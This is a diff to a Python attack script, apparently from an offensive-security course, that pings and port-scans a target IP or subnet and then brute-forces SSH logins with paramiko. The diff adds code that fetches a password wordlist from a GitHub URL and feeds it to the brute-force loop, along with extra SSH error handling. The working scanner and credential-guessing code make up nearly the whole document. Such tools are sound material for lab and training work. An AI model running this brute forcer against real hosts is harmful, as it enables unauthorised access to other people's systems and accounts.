@@ -9,6 +9,7 @@ import logging
 import time
 import paramiko, os, sys, socket
 import zipfile
+import requests
 
 # Suppressing Scapy warnings
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -94,6 +95,19 @@ def icmp_ping_and_scan(target_ip, ports):
     if "/" in target_ip:
         print(f"\n{online_count} hosts are online.")
 
+# Function to download a file from a URL and save it locally
+def download_file(url, local_file_path):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        with open(local_file_path, 'wb') as file:
+            file.write(response.content)
+        print(f"File downloaded successfully and saved as {local_file_path}")
+        return local_file_path
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred while downloading the file: {e}")
+        return None
+
 # Function to read passwords from a file
 def read_passwords(password_file):
     # Open the file in read mode
@@ -111,11 +125,13 @@ def check_filepath(file_path, file_description):
     # Return True if the file path is valid
     return True
 
-def ssh_brute_force(target_ip):    
+def ssh_brute_force(target_ip, password_file_url):    
     # Prompt the user for target host address, SSH username, and password file path
     username = input("Enter SSH Username: ")
-    input_file = input("Enter SSH Password File: ")
-
+    local_file_path = 'downloaded_password_file.txt'
+    input_file = download_file(password_file_url, local_file_path)
+    if input_file is None:
+        return
     # Checks if file path exists
     if not check_filepath(input_file, "Password file"):
         return
@@ -135,8 +151,6 @@ def ssh_brute_force(target_ip):
                     # Attempt SSH connection using the current password
                     print(f"Trying password: {password}")
                     ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=10, auth_timeout=10)
-                    # Close the SSH connection
-                    # ssh.close()
                     # Print success message if password is correct
                     print(f"٩(◕‿◕)۶ Success! Password found: {password}")
                     return
@@ -147,8 +161,10 @@ def ssh_brute_force(target_ip):
                     # Print error message if a socket error occurs
                     print(f"(`･︿´･ ) An error occurred: {e}")
                 except paramiko.SSHException as e:
-                    # Handle other SSH exceptions
+                    # Handle SSH exceptions, including banner errors
                     print(f"(`･︿´･ ) SSH error occurred: {e}")
+                    if "Error reading SSH protocol banner" in str(e):
+                        print("Error reading SSH protocol banner. Ensure the target server is an SSH server and is reachable.")
                     time.sleep(1)  # Sleep briefly to avoid overwhelming the server
     except KeyboardInterrupt:
         # Print message if user interrupts the process
@@ -236,5 +252,6 @@ def menu():
 if __name__ == "__main__":
     target_ip = input("Enter the target IP address or network (e.g., 192.168.1.1 or 192.168.1.0/24): ")
     icmp_ping_and_scan(target_ip, [22, 80, 443, 3389])
-    ssh_brute_force(target_ip)
+    password_file_url = 'https://raw.githubusercontent.com/oardid/ops-challenges/main/ops-401/rockyoutest.txt'
+    ssh_brute_force(target_ip, password_file_url)
     menu()
